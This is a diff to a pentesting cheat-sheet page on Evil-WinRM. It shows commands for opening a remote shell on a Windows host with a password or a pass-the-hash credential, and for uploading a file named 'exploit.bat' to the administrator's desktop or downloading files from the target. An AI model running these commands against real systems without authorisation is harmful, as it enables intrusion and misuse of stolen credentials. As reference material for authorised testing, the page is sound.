@@ -2,22 +2,28 @@
 title: Evil-WinRM
 desc: Windows Remote Management shell for pentesting. It's also used for Pass The Hash.
 tags: [ActiveDirectory, PassTheHash, Windows, WinRM]
-alts: []
+alts: [CrackMapExec]
 website: https://github.com/Hackplayers/evil-winrm
 render_with_liquid: false
 ---
 
-## Basic
+## Connect
 
 ```sh
 evil-winrm -i 10.0.0.1 -P 5985 -u username -p password
+
+# Pass The Hash
+evil-winrm -i 10.0.0.1 -P 5985 -u username -H 0e0363213e37b94221497260b0bcb4fc
 ```
 
 <br />
 
-## Pass The Hash
+## Useful Commands After Connecting...
 
-```sh
-# Specify hash instead of password
-evil-winrm -i 10.0.0.1 -u admin -H 0e0363213e37b94221497260b0bcb4fc
+```powershell
+# Upload a local file to Windows machine
+PS> upload ./example.bat c:\\Users\Administrator\Desktop\exploit.bat
+
+# Download a file to Local
+PS> download c:\\Users\Administrator\Desktop\example.txt ./example.txt
 ```
